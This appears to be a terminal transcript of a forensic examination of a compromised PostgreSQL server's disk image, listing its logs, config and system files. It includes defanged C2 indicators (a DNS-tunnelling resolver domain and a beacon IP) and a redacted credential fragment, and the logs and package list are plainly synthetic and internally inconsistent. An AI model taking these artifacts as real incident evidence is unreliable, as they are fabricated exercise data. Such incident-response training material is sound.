+Aug 23 00:39:14 postgres-prod-01 sshd[1938]: Received disconnect from 10.10.31.154 port 41608:11: disconnected by user
+Aug 23 00:39:59 postgres-prod-01 sshd[3127]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 23 00:40:39 postgres-prod-01 sshd[8360]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 23 00:40:41 postgres-prod-01 sshd[6450]: Received disconnect from 10.10.31.94 port 49991:11: disconnected by user
+Aug 23 00:40:46 postgres-prod-01 sshd[2146]: Received disconnect from 10.10.31.101 port 43881:11: disconnected by user
+Aug 23 00:41:14 postgres-prod-01 sshd[6855]: Accepted publickey for root from 10.10.31.17 port 57027 ssh2: RSA SHA256:679f3f95
+Aug 23 00:41:55 postgres-prod-01 sshd[6092]: pam_unix(sudo:session): session opened for user root by devops(uid=1005)
+Aug 23 00:42:26 postgres-prod-01 sshd[1806]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1003)
+Aug 23 00:42:47 postgres-prod-01 sshd[5348]: Received disconnect from 10.10.31.138 port 49811:11: disconnected by user
+Aug 23 00:43:25 postgres-prod-01 sshd[4795]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Aug 23 00:43:36 postgres-prod-01 sshd[7486]: Accepted publickey for svc-backup from 10.10.31.148 port 46945 ssh2: RSA SHA256:123ac773
+Aug 23 00:44:17 postgres-prod-01 sshd[7151]: Accepted publickey for webadmin from 10.10.31.104 port 42637 ssh2: RSA SHA256:3d4cd014
+Aug 23 00:44:31 postgres-prod-01 sshd[3450]: Accepted publickey for jenkins from 10.10.31.238 port 57495 ssh2: RSA SHA256:247404bb
+Aug 23 00:45:10 postgres-prod-01 sshd[3591]: Accepted publickey for root from 10.10.31.186 port 54337 ssh2: RSA SHA256:27228b04
+Aug 23 00:45:48 postgres-prod-01 sshd[3886]: Received disconnect from 10.10.31.76 port 48660:11: disconnected by user
+Aug 23 00:45:50 postgres-prod-01 sshd[8610]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Aug 23 00:46:14 postgres-prod-01 sshd[5916]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 23 00:46:58 postgres-prod-01 sshd[6094]: pam_unix(sudo:session): session opened for user root by root(uid=1000)
+Aug 23 00:47:42 postgres-prod-01 sshd[1202]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1005)
+Aug 23 00:47:57 postgres-prod-01 sshd[2322]: Received disconnect from 10.10.31.223 port 48016:11: disconnected by user
+Aug 23 00:48:37 postgres-prod-01 sshd[8847]: Received disconnect from 10.10.31.97 port 56805:11: disconnected by user
+Aug 23 00:48:47 postgres-prod-01 sshd[7887]: Received disconnect from 10.10.31.35 port 51196:11: disconnected by user
+Aug 23 00:49:23 postgres-prod-01 sshd[3811]: pam_unix(sudo:session): session opened for user root by root(uid=1000)
+Aug 23 00:49:48 postgres-prod-01 sshd[3673]: Accepted publickey for root from 10.10.31.221 port 62477 ssh2: RSA SHA256:2441f72a
+Aug 23 00:49:54 postgres-prod-01 sshd[1090]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+[?2004hroot@654d0bd251de:/app# find /disk -name "*.log" -o -name "messages" -o -name "secure*" -o -name "*postgres*" 2>/dev/null
+[?2004l/disk/var/spool/cron/postgres
+/disk/var/log/messages
+/disk/var/log/secure
+/disk/var/log/secure.1.gz
+/disk/var/log/kern.log
+[?2004hroot@654d0bd251de:/app# find /disk -type f
+[?2004l/disk/etc/passwd
+/disk/etc/fstab
+/disk/etc/crontab
+/disk/etc/hosts
+/disk/etc/group
+/disk/etc/hostname
+/disk/etc/systemd/system/pg-metrics.service
+/disk/etc/systemd/system/pg-backup.service
+/disk/etc/os-release
+/disk/etc/pgdaemon.conf
+/disk/var/spool/cron/postgres
+/disk/var/log/messages
+/disk/var/log/secure
+/disk/var/log/secure.1.gz
+/disk/var/log/wtmp.csv
+/disk/var/log/kern.log
+/disk/var/lib/pgsql/data/pg_hba.conf
+/disk/var/lib/pgsql/.local/pgdaemon
+/disk/var/lib/pgsql/.local/.timestamps
+/disk/var/lib/dpkg/status.summary
+/disk/var/lib/.cache/.wiped.bin
+/disk/home/devops/.bash_history
+/disk/root/.bashrc
+[?2004hroot@654d0bd251de:/app# cat /disk/etc/pgdaemon.conf
+[?2004l# pgdaemon.conf (managed)
+
+DNS tunneling C2 config: resolver=update-postgres[.]example[.]cn (defanged) ‚Äî data over dns tunnel
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/var/lib/dpkg/status.summary
+[?2004lPackage: pkg0
+Status: install ok installed
+Version: 1.8.24
+
+Package: pkg1
+Status: install ok installed
+Version: 1.1.15
+
+Package: pkg2
+Status: install ok installed
+Version: 1.7.2
+
+Package: pkg3
+Status: install ok installed
+Version: 1.0.7
+
+Package: pkg4
+Status: install ok installed
+Version: 1.6.5
+
+Package: pkg5
+Status: install ok installed
+Version: 1.7.11
+
+Package: pkg6
+Status: install ok installed
+Version: 1.5.8
+
+Package: pkg7
+Status: install ok installed
+Version: 1.3.6
+
+Package: pkg8
+Status: install ok installed
+Version: 1.5.5
+
+Package: pkg9
+Status: install ok installed
+Version: 1.0.24
+
+Package: pkg10
+Status: install ok installed
+Version: 1.0.26
+
+Package: pkg11
+Status: install ok installed
+Version: 1.6.17
+
+Package: pkg12
+Status: install ok installed
+Version: 1.0.7
+
+Package: pkg13
+Status: install ok installed
+Version: 1.2.4
+
+Package: pkg14
+Status: install ok installed
+Version: 1.5.17
+
+Package: pkg15
+Status: install ok installed
+Version: 1.1.12
+
+Package: pkg16
+Status: install ok installed
+Version: 1.2.28
+
+Package: pkg17
+Status: install ok installed
+Version: 1.6.5
+
+Package: pkg18
+Status: install ok installed
+Version: 1.1.22
+
+Package: pkg19
+Status: install ok installed
+Version: 1.0.28
+
+Package: pkg20
+Status: install ok installed
+Version: 1.9.11
+
+Package: pkg21
+Status: install ok installed
+Version: 1.6.9
+
+Package: pkg22
+Status: install ok installed
+Version: 1.0.20
+
+Package: pkg23
+Status: install ok installed
+Version: 1.2.8
+
+Package: pkg24
+Status: install ok installed
+Version: 1.7.15
+
+Package: pkg25
+Status: install ok installed
+Version: 1.1.9
+
+Package: pkg26
+Status: install ok installed
+Version: 1.9.28
+
+Package: pkg27
+Status: install ok installed
+Version: 1.7.4
+
+Package: pkg28
+Status: install ok installed
+Version: 1.3.10
+
+Package: pkg29
+Status: install ok installed
+Version: 1.6.1
+
+Package: pkg30
+Status: install ok installed
+Version: 1.4.29
+
+Package: pkg31
+Status: install ok installed
+Version: 1.8.12
+
+Package: pkg32
+Status: install ok installed
+Version: 1.6.3
+
+Package: pkg33
+Status: install ok installed
+Version: 1.7.25
+
+Package: pkg34
+Status: install ok installed
+Version: 1.1.2
+
+Package: pkg35
+Status: install ok installed
+Version: 1.6.3
+
+Package: pkg36
+Status: install ok installed
+Version: 1.6.22
+
+Package: pkg37
+Status: install ok installed
+Version: 1.2.18
+
+Package: pkg38
+Status: install ok installed
+Version: 1.5.28
+
+Package: pkg39
+Status: install ok installed
+Version: 1.4.3
+
+Package: pkg40
+Status: install ok installed
+Version: 1.5.20
+
+Package: pkg41
+Status: install ok installed
+Version: 1.1.9
+
+Package: pkg42
+Status: install ok installed
+Version: 1.9.21
+
+Package: pkg43
+Status: install ok installed
+Version: 1.3.13
+
+Package: pkg44
+Status: install ok installed
+Version: 1.2.12
+
+Package: pkg45
+Status: install ok installed
+Version: 1.2.1
+
+Package: pkg46
+Status: install ok installed
+Version: 1.5.0
+
+Package: pkg47
+Status: install ok installed
+Version: 1.7.7
+
+Package: pkg48
+Status: install ok installed
+Version: 1.8.21
+
+Package: pkg49
+Status: install ok installed
+Version: 1.8.5
+
+Package: pkg50
+Status: install ok installed
+Version: 1.1.10
+
+Package: pkg51
+Status: install ok installed
+Version: 1.2.8
+
+Package: pkg52
+Status: install ok installed
+Version: 1.7.12
+
+Package: pkg53
+Status: install ok installed
+Version: 1.2.4
+
+Package: pkg54
+Status: install ok installed
+Version: 1.6.29
+
+Package: pkg55
+Status: install ok installed
+Version: 1.2.27
+
+Package: pkg56
+Status: install ok installed
+Version: 1.2.25
+
+Package: pkg57
+Status: install ok installed
+Version: 1.3.19
+
+Package: pkg58
+Status: install ok installed
+Version: 1.6.3
+
+Package: pkg59
+Status: install ok installed
+Version: 1.9.11
+
+Package: pkg60
+Status: install ok installed
+Version: 1.7.11
+
+Package: pkg61
+Status: install ok installed
+Version: 1.3.0
+
+Package: pkg62
+Status: install ok installed
+Version: 1.1.8
+
+Package: pkg63
+Status: install ok installed
+Version: 1.0.26
+
+Package: pkg64
+Status: install ok installed
+Version: 1.1.11
+
+Package: pkg65
+Status: install ok installed
+Version: 1.5.30
+
+Package: pkg66
+Status: install ok installed
+Version: 1.5.20
+
+Package: pkg67
+Status: install ok installed
+Version: 1.7.14
+
+Package: pkg68
+Status: install ok installed
+Version: 1.0.5
+
+Package: pkg69
+Status: install ok installed
+Version: 1.4.28
+
+Package: pkg70
+Status: install ok installed
+Version: 1.8.25
+
+Package: pkg71
+Status: install ok installed
+Version: 1.8.21
+
+Package: pkg72
+Status: install ok installed
+Version: 1.6.7
+
+Package: pkg73
+Status: install ok installed
+Version: 1.7.6
+
+Package: pkg74
+Status: install ok installed
+Version: 1.1.1
+
+Package: pkg75
+Status: install ok installed
+Version: 1.9.27
+
+Package: pkg76
+Status: install ok installed
+Version: 1.6.12
+
+Package: pkg77
+Status: install ok installed
+Version: 1.2.6
+
+Package: pkg78
+Status: install ok installed
+Version: 1.4.11
+
+Package: pkg79
+Status: install ok installed
+Version: 1.8.3
+
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/var/lib/.cache/.wiped.bin
+[?2004lpartial recover: C2 beacon to 198.51.100.214 domain update-postgres[.]example[.]cn  ˇ˛8m¢◊Av´‡J¥ÈSàΩÚ'\ë∆˚0eöœ9n£ÿBw¨·KÄµÍTâæÛ(]í«¸1fõ–:o§ŸCx≠‚LÅ∂Î UäøÙ)^ì»˝2gú—;p•⁄DyÆ„MÇ∑Ï!Vã¿ı*_î…˛3hù“<q¶€EzØ‰NÉ∏Ì"Wå¡ˆ+`ï ˇ4iû”=rß‹F{∞ÂOÑπÓ#Xç¬˜,añÀ 5jü‘	>s®›G|±ÊPÖ∫Ô$Yé√¯-bóÃ6k†’
+?t©ﬁH}≤ÁQÜª%Zèƒ˘.còÕ7l°÷@u™ﬂI~≥ËRáºÒ&[ê≈˙/dôŒ
+credential cache fragment (defanged): administrator:<ntlm-hash-redacted>
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/etc/hosts
+[?2004l127.0.0.1 localhost
+10.10.31.1 postgres-prod-01
+[?2004hroot@654d0bd251de:/app# cat /disk/etc/passwd
+[?2004lroot:x:0:0:root:/root:/bin/bash
+devops:x:1000:1000::/home/devops:/bin/bash
+webadmin:x:1001:1001::/home/webadmin:/bin/bash
+svc-backup:x:1002:1002::/home/svc-backup:/bin/bash
+postgres:x:1003:1003::/home/postgres:/bin/bash
+jenkins:x:1004:1004::/home/jenkins:/bin/bash
+nobody:x:65534:65534::/:/usr/sbin/nologin
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/etc/crontab
+[?2004lSHELL=/bin/bash
+0 3 * * * root /usr/local/bin/backup.sh
+17 * * * * root run-parts /etc/cron.hourly
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/etc/hostname
+[?2004lpostgres-prod-01
+[?2004hroot@654d0bd251de:/app# cat /disk/var/log/kern.log
+[?2004lAug 23 01:06:43 postgres-prod-01 dbus-daemon[17865]: Started Session 253 of user webadmin.
+Aug 23 01:07:19 postgres-prod-01 sudo[20227]: pam_unix(cron:session): session opened for user root
+Aug 23 01:07:27 postgres-prod-01 sudo[18242]: Time synchronised to time server
+Aug 23 01:07:59 postgres-prod-01 CRON[17285]: Received disconnect from 10.10.31.239 port 57043:11: disconnected by user
+Aug 23 01:08:32 postgres-prod-01 sshd[16056]: pam_unix(cron:session): session opened for user root
+Aug 23 01:08:42 postgres-prod-01 kernel[23325]: Received disconnect from 10.10.31.237 port 56389:11: disconnected by user
+Aug 23 01:09:05 postgres-prod-01 sshd[6804]: Time synchronised to time server
+Aug 23 01:09:42 postgres-prod-01 chronyd[8078]: Received disconnect from 10.10.31.224 port 64145:11: disconnected by user
+Aug 23 01:09:55 postgres-prod-01 kernel[24700]: CPU0: Package temperature normal
+Aug 23 01:09:57 postgres-prod-01 sudo[17783]: Time synchronised to time server
+Aug 23 01:10:46 postgres-prod-01 systemd[18705]: CPU0: Package temperature normal
+Aug 23 01:11:07 postgres-prod-01 kernel[13111]: Time synchronised to time server
+Aug 23 01:11:32 postgres-prod-01 CRON[1078]: CPU0: Package temperature normal
+Aug 23 01:11:50 postgres-prod-01 systemd-logind[900]: CPU0: Package temperature normal
+Aug 23 01:12:38 postgres-prod-01 systemd[11034]: CPU0: Package temperature normal
+Aug 23 01:13:06 postgres-prod-01 systemd-logind[23668]: pam_unix(cron:session): session opened for user root
+Aug 23 01:13:39 postgres-prod-01 systemd[14642]: pam_unix(cron:session): session opened for user root
+Aug 23 01:14:12 postgres-prod-01 sshd[14203]: Time synchronised to time server
+Aug 23 01:14:49 postgres-prod-01 CRON[19174]: Started Session 491 of user webadmin.
+Aug 23 01:15:21 postgres-prod-01 sudo[19583]: CPU0: Package temperature normal
+Aug 23 01:15:34 postgres-prod-01 systemd-logind[23613]: CPU0: Package temperature normal
+Aug 23 01:15:43 postgres-prod-01 systemd[25896]: CPU0: Package temperature normal
+Aug 23 01:16:25 postgres-prod-01 chronyd[14009]: Received disconnect from 10.10.31.61 port 40539:11: disconnected by user
+Aug 23 01:17:03 postgres-prod-01 sudo[20238]: Time synchronised to time server
+Aug 23 01:17:24 postgres-prod-01 kernel[18794]: Time synchronised to time server
+Aug 23 01:17:55 postgres-prod-01 sudo[4320]: CPU0: Package temperature normal
+Aug 23 01:18:11 postgres-prod-01 sudo[14883]: pam_unix(cron:session): session opened for user root
+Aug 23 01:18:47 postgres-prod-01 CRON[16226]: Started Session 693 of user svc-backup.
+Aug 23 01:19:06 postgres-prod-01 systemd-logind[20690]: Started Session 563 of user jenkins.
+Aug 23 01:19:39 postgres-prod-01 CRON[28991]: Received disconnect from 10.10.31.165 port 49047:11: disconnected by user
+Aug 23 01:19:58 postgres-prod-01 systemd[21871]: Time synchronised to time server
+Aug 23 01:20:17 postgres-prod-01 CRON[2660]: Time synchronised to time server
+Aug 23 01:20:53 postgres-prod-01 sudo[24080]: CPU0: Package temperature normal
+Aug 23 01:21:25 postgres-prod-01 dbus-daemon[7700]: Received disconnect from 10.10.31.23 port 48283:11: disconnected by user
+Aug 23 01:21:53 postgres-prod-01 chronyd[7384]: Started Session 755 of user webadmin.
+Aug 23 01:21:55 postgres-prod-01 systemd[29345]: CPU0: Package temperature normal
+Aug 23 01:22:12 postgres-prod-01 kernel[8611]: pam_unix(cron:session): session opened for user root
+Aug 23 01:22:59 postgres-prod-01 kernel[11355]: Time synchronised to time server
+Aug 23 01:23:11 postgres-prod-01 chronyd[14592]: pam_unix(cron:session): session opened for user root
+Aug 23 01:24:01 postgres-prod-01 sudo[2976]: Started Session 948 of user postgres.
+Aug 23 01:24:32 postgres-prod-01 sshd[16790]: CPU0: Package temperature normal
+Aug 23 01:25:16 postgres-prod-01 systemd[9148]: pam_unix(cron:session): session opened for user root
+Aug 23 01:25:51 postgres-prod-01 dbus-daemon[12789]: Received disconnect from 10.10.31.219 port 50374:11: disconnected by user
+Aug 23 01:26:15 postgres-prod-01 sudo[13900]: Started Session 837 of user postgres.
+Aug 23 01:26:40 postgres-prod-01 sudo[11689]: pam_unix(cron:session): session opened for user root
+Aug 23 01:27:29 postgres-prod-01 sudo[15507]: Started Session 567 of user webadmin.
+Aug 23 01:27:45 postgres-prod-01 CRON[24830]: pam_unix(cron:session): session opened for user root
+Aug 23 01:27:47 postgres-prod-01 kernel[16484]: Received disconnect from 10.10.31.22 port 61337:11: disconnected by user
+Aug 23 01:28:21 postgres-prod-01 sshd[13918]: pam_unix(cron:session): session opened for user root
+Aug 23 01:28:40 postgres-prod-01 chronyd[642]: pam_unix(cron:session): session opened for user root
+Aug 23 01:29:15 postgres-prod-01 sshd[26110]: Started Session 626 of user devops.
+Aug 23 01:30:01 postgres-prod-01 systemd[745]: Received disconnect from 10.10.31.127 port 46206:11: disconnected by user
+Aug 23 01:30:19 postgres-prod-01 CRON[26981]: CPU0: Package temperature normal
+Aug 23 01:31:13 postgres-prod-01 chronyd[8927]: CPU0: Package temperature normal
+Aug 23 01:31:42 postgres-prod-01 sshd[11478]: pam_unix(cron:session): session opened for user root
+Aug 23 01:32:09 postgres-prod-01 chronyd[25659]: Received disconnect from 10.10.31.83 port 44342:11: disconnected by user
+Aug 23 01:32:57 postgres-prod-01 systemd[26027]: Time synchronised to time server
+Aug 23 01:33:51 postgres-prod-01 sudo[11554]: Started Session 209 of user webadmin.
+Aug 23 01:34:02 postgres-prod-01 sshd[10184]: Time synchronised to time server
+Aug 23 01:34:34 postgres-prod-01 kernel[21943]: CPU0: Package temperature normal
+Aug 23 01:35:03 postgres-prod-01 chronyd[8237]: pam_unix(cron:session): session opened for user root
+Aug 23 01:35:36 postgres-prod-01 sshd[22132]: Time synchronised to time server
+Aug 23 01:35:37 postgres-prod-01 chronyd[451]: CPU0: Package temperature normal
+Aug 23 01:35:58 postgres-prod-01 kernel[2993]: pam_unix(cron:session): session opened for user root
+Aug 23 01:36:17 postgres-prod-01 systemd-logind[23475]: Started Session 960 of user devops.
+Aug 23 01:37:06 postgres-prod-01 kernel[26817]: Time synchronised to time server
+Aug 23 01:37:55 postgres-prod-01 sshd[7731]: CPU0: Package temperature normal
+Aug 23 01:38:20 postgres-prod-01 chronyd[29097]: pam_unix(cron:session): session opened for user root
+Aug 23 01:38:39 postgres-prod-01 kernel[16146]: Started Session 115 of user root.
+Aug 23 01:39:30 postgres-prod-01 sshd[28920]: CPU0: Package temperature normal
+Aug 23 01:39:43 postgres-prod-01 sudo[24299]: Started Session 167 of user jenkins.
+Aug 23 01:40:02 postgres-prod-01 dbus-daemon[5134]: CPU0: Package temperature normal
+Aug 23 01:40:46 postgres-prod-01 chronyd[27078]: Time synchronised to time server
+Aug 23 01:40:56 postgres-prod-01 chronyd[1803]: pam_unix(cron:session): session opened for user root
+Aug 23 01:40:59 postgres-prod-01 systemd[10101]: CPU0: Package temperature normal
+Aug 23 01:41:23 postgres-prod-01 systemd-logind[17177]: pam_unix(cron:session): session opened for user root
+Aug 23 01:42:13 postgres-prod-01 sshd[23691]: CPU0: Package temperature normal
+Aug 23 01:43:04 postgres-prod-01 dbus-daemon[20051]: CPU0: Package temperature normal
+Aug 23 01:43:54 postgres-prod-01 systemd[4397]: CPU0: Package temperature normal
+Aug 23 01:44:09 postgres-prod-01 dbus-daemon[20812]: Time synchronised to time server
+Aug 23 01:44:20 postgres-prod-01 sudo[10689]: Time synchronised to time server
+Aug 23 01:44:42 postgres-prod-01 sshd[28391]: Started Session 41 of user svc-backup.
+Aug 23 01:44:57 postgres-prod-01 chronyd[21969]: pam_unix(cron:session): session opened for user root
+Aug 23 01:45:27 postgres-prod-01 CRON[13066]: pam_unix(cron:session): session opened for user root
+Aug 23 01:46:09 postgres-prod-01 chronyd[344]: Started Session 161 of user svc-backup.
+Aug 23 01:46:41 postgres-prod-01 sudo[10439]: Time synchronised to time server
+Aug 23 01:47:25 postgres-prod-01 chronyd[3386]: pam_unix(cron:session): session opened for user root
+Aug 23 01:47:58 postgres-prod-01 sshd[575]: pam_unix(cron:session): session opened for user root
+Aug 23 01:48:11 postgres-prod-01 chronyd[4604]: Time synchronised to time server
+Aug 23 01:48:37 postgres-prod-01 sshd[20312]: pam_unix(cron:session): session opened for user root
+Aug 23 01:48:55 postgres-prod-01 dbus-daemon[9215]: Received disconnect from 10.10.31.120 port 62579:11: disconnected by user
+Aug 23 01:49:39 postgres-prod-01 dbus-daemon[28968]: Received disconnect from 10.10.31.150 port 44595:11: disconnected by user
+Aug 23 01:49:57 postgres-prod-01 systemd-logind[1735]: CPU0: Package temperature normal
+Aug 23 01:50:33 postgres-prod-01 systemd-logind[22674]: Started Session 591 of user webadmin.
+Aug 23 01:51:28 postgres-prod-01 chronyd[4149]: Started Session 215 of user svc-backup.
+Aug 23 01:51:56 postgres-prod-01 sshd[24406]: pam_unix(cron:session): session opened for user root
+Aug 23 01:51:59 postgres-prod-01 systemd-logind[2360]: CPU0: Package temperature normal
+Aug 23 01:52:40 postgres-prod-01 systemd-logind[24136]: Time synchronised to time server
+Aug 23 01:52:47 postgres-prod-01 chronyd[13719]: Time synchronised to time server
+Aug 23 01:53:37 postgres-prod-01 dbus-daemon[886]: pam_unix(cron:session): session opened for user root
+Aug 23 01:54:13 postgres-prod-01 kernel[29635]: CPU0: Package temperature normal
+Aug 23 01:54:43 postgres-prod-01 systemd-logind[22503]: Started Session 318 of user postgres.
+Aug 23 01:55:18 postgres-prod-01 chronyd[23481]: Received disconnect from 10.10.31.86 port 40942:11: disconnected by user
+Aug 23 01:56:12 postgres-prod-01 sudo[8194]: Received disconnect from 10.10.31.130 port 44671:11: disconnected by user
+Aug 23 01:56:59 postgres-prod-01 sshd[17310]: Received disconnect from 10.10.31.204 port 61994:11: disconnected by user
+Aug 23 01:57:16 postgres-prod-01 chronyd[3871]: Received disconnect from 10.10.31.216 port 51815:11: disconnected by user
+Aug 23 01:57:26 postgres-prod-01 systemd[16619]: pam_unix(cron:session): session opened for user root
+Aug 23 01:57:50 postgres-prod-01 kernel[10453]: Time synchronised to time server
+Aug 23 01:58:16 postgres-prod-01 chronyd[4079]: Received disconnect from 10.10.31.139 port 47453:11: disconnected by user
+Aug 23 01:59:07 postgres-prod-01 sudo[21398]: Started Session 704 of user root.
+Aug 23 01:59:12 postgres-prod-01 systemd-logind[23748]: Started Session 932 of user root.
+Aug 23 01:59:24 postgres-prod-01 sudo[16447]: pam_unix(cron:session): session opened for user root
+Aug 23 01:59:37 postgres-prod-01 systemd[26435]: Started Session 803 of user postgres.
+Aug 23 02:00:03 postgres-prod-01 sshd[10839]: CPU0: Package temperature normal
+Aug 23 02:00:23 postgres-prod-01 dbus-daemon[27788]: Started Session 953 of user postgres.
+Aug 23 02:00:43 postgres-prod-01 dbus-daemon[17529]: CPU0: Package temperature normal
+Aug 23 02:00:52 postgres-prod-01 sudo[6294]: CPU0: Package temperature normal
+Aug 23 02:01:33 postgres-prod-01 kernel[4602]: Received disconnect from 10.10.31.214 port 50987:11: disconnected by user
+Aug 23 02:02:06 postgres-prod-01 chronyd[11001]: Received disconnect from 10.10.31.20 port 57917:11: disconnected by user
+Aug 23 02:02:52 postgres-prod-01 dbus-daemon[10416]: pam_unix(cron:session): session opened for user root
+Aug 23 02:03:33 postgres-prod-01 systemd[15861]: CPU0: Package temperature normal
+Aug 23 02:04:04 postgres-prod-01 dbus-daemon[5201]: pam_unix(cron:session): session opened for user root
+Aug 23 02:04:18 postgres-prod-01 sshd[11440]: pam_unix(cron:session): session opened for user root
+Aug 23 02:04:47 postgres-prod-01 dbus-daemon[27493]: Started Session 642 of user webadmin.
+Aug 23 02:05:31 postgres-prod-01 CRON[25961]: CPU0: Package temperature normal
+Aug 23 02:06:20 postgres-prod-01 systemd-logind[13771]: Started Session 242 of user svc-backup.
+Aug 23 02:07:12 postgres-prod-01 systemd[19832]: CPU0: Package temperature normal
+Aug 23 02:07:49 postgres-prod-01 chronyd[10391]: Started Session 152 of user jenkins.
+Aug 23 02:08:44 postgres-prod-01 sudo[25190]: CPU0: Package temperature normal
+Aug 23 02:09:28 postgres-prod-01 sudo[14128]: pam_unix(cron:session): session opened for user root
+Aug 23 02:10:17 postgres-prod-01 sshd[13111]: Received disconnect from 10.10.31.45 port 47147:11: disconnected by user
+Aug 23 02:11:00 postgres-prod-01 systemd-logind[26806]: Time synchronised to time server
+Aug 23 02:11:29 postgres-prod-01 sudo[8484]: pam_unix(cron:session): session opened for user root
+Aug 23 02:12:05 postgres-prod-01 systemd-logind[358]: Started Session 955 of user postgres.
+Aug 23 02:12:10 postgres-prod-01 systemd-logind[26090]: Received disconnect from 10.10.31.12 port 44936:11: disconnected by user
+Aug 23 02:12:36 postgres-prod-01 sudo[16896]: Received disconnect from 10.10.31.135 port 44129:11: disconnected by user
+Aug 23 02:12:41 postgres-prod-01 dbus-daemon[3907]: pam_unix(cron:session): session opened for user root
+Aug 23 02:12:54 postgres-prod-01 kernel[18828]: Time synchronised to time server
+Aug 23 02:13:07 postgres-prod-01 chronyd[5421]: CPU0: Package temperature normal
+Aug 23 02:13:27 postgres-prod-01 sudo[22615]: Started Session 492 of user jenkins.
+Aug 23 02:13:33 postgres-prod-01 kernel[8423]: Received disconnect from 10.10.31.179 port 40312:11: disconnected by user
+Aug 23 02:13:48 postgres-prod-01 CRON[11375]: Started Session 294 of user jenkins.
+Aug 23 02:14:24 postgres-prod-01 systemd[19592]: pam_unix(cron:session): session opened for user root
+Aug 23 02:14:43 postgres-prod-01 dbus-daemon[6015]: Time synchronised to time server
+Aug 23 02:15:17 postgres-prod-01 CRON[4880]: Started Session 608 of user jenkins.
+Aug 23 02:16:09 postgres-prod-01 sudo[26031]: Received disconnect from 10.10.31.199 port 63566:11: disconnected by user
+Aug 23 02:16:40 postgres-prod-01 sshd[14248]: pam_unix(cron:session): session opened for user root
+Aug 23 02:16:44 postgres-prod-01 CRON[23678]: pam_unix(cron:session): session opened for user root
+Aug 23 02:16:54 postgres-prod-01 systemd-logind[10146]: pam_unix(cron:session): session opened for user root
+Aug 23 02:17:03 postgres-prod-01 chronyd[20975]: Time synchronised to time server
+Aug 23 02:17:53 postgres-prod-01 sshd[907]: pam_unix(cron:session): session opened for user root
+Aug 23 02:17:56 postgres-prod-01 systemd-logind[17014]: Time synchronised to time server
+Aug 23 02:18:51 postgres-prod-01 CRON[10911]: Time synchronised to time server
+Aug 23 02:19:30 postgres-prod-01 sudo[22521]: CPU0: Package temperature normal
+Aug 23 02:20:05 postgres-prod-01 sudo[11108]: Time synchronised to time server
+Aug 23 02:20:49 postgres-prod-01 kernel[2283]: Received disconnect from 10.10.31.40 port 50005:11: disconnected by user
+Aug 23 02:21:32 postgres-prod-01 CRON[725]: Time synchronised to time server
+Aug 23 02:22:08 postgres-prod-01 dbus-daemon[17551]: pam_unix(cron:session): session opened for user root
+Aug 23 02:22:42 postgres-prod-01 sshd[26350]: pam_unix(cron:session): session opened for user root
+Aug 23 02:23:27 postgres-prod-01 CRON[17586]: CPU0: Package temperature normal
+Aug 23 02:24:03 postgres-prod-01 kernel[21550]: Started Session 515 of user svc-backup.
+Aug 23 02:24:10 postgres-prod-01 chronyd[16382]: Started Session 908 of user svc-backup.
+Aug 23 02:24:39 postgres-prod-01 dbus-daemon[13807]: Time synchronised to time server
+Aug 23 02:24:46 postgres-prod-01 kernel[24865]: Time synchronised to time server
+Aug 23 02:24:59 postgres-prod-01 systemd[10376]: Received disconnect from 10.10.31.210 port 47279:11: disconnected by user
+Aug 23 02:25:24 postgres-prod-01 systemd-logind[4155]: Started Session 446 of user webadmin.
+Aug 23 02:26:05 postgres-prod-01 chronyd[3222]: pam_unix(cron:session): session opened for user root
+Aug 23 02:26:34 postgres-prod-01 kernel[22487]: pam_unix(cron:session): session opened for user root
+Aug 23 02:26:46 postgres-prod-01 kernel[14891]: Started Session 720 of user svc-backup.
+Aug 23 02:27:11 postgres-prod-01 sshd[28238]: Started Session 97 of user devops.
+[?2004hroot@654d0bd251de:/app# echo "==="
+[?2004l===
+[?2004hroot@654d0bd251de:/app# cat /disk/var/log/messages
+[?2004lAug 23 01:06:52 postgres-prod-01 sudo[1374]: Time synchronised to time server
+Aug 23 01:07:41 postgres-prod-01 CRON[14521]: Time synchronised to time server
+Aug 23 01:08:04 postgres-prod-01 sudo[13615]: Received disconnect from 10.10.31.171 port 43912:11: disconnected by user
+Aug 23 01:08:21 postgres-prod-01 systemd-logind[27570]: CPU0: Package temperature normal
+Aug 23 01:08:54 postgres-prod-01 chronyd[16210]: Time synchronised to time server
+Aug 23 01:08:55 postgres-prod-01 dbus-daemon[15432]: Started Session 617 of user root.
+Aug 23 01:09:14 postgres-prod-01 sudo[22696]: CPU0: Package temperature normal
+Aug 23 01:09:44 postgres-prod-01 CRON[28431]: pam_unix(cron:session): session opened for user root
+Aug 23 01:09:47 postgres-prod-01 kernel[26898]: Time synchronised to time server
+Aug 23 01:09:51 postgres-prod-01 systemd[19513]: CPU0: Package temperature normal
+Aug 23 01:10:33 postgres-prod-01 sshd[23789]: Received disconnect from 10.10.31.118 port 42894:11: disconnected by user
+Aug 23 01:10:55 postgres-prod-01 systemd-logind[22995]: pam_unix(cron:session): session opened for user root
+Aug 23 01:10:59 postgres-prod-01 systemd[8067]: Time synchronised to time server
+Aug 23 01:11:05 postgres-prod-01 sshd[17789]: Time synchronised to time server
+Aug 23 01:11:15 postgres-prod-01 sshd[13659]: pam_unix(cron:session): session opened for user root
+Aug 23 01:11:39 postgres-prod-01 kernel[15275]: pam_unix(cron:session): session opened for user root
+Aug 23 01:12:00 postgres-prod-01 chronyd[20228]: CPU0: Package temperature normal
+Aug 23 01:12:46 postgres-prod-01 systemd[27277]: Started Session 755 of user postgres.
+Aug 23 01:12:50 postgres-prod-01 sshd[2608]: Time synchronised to time server
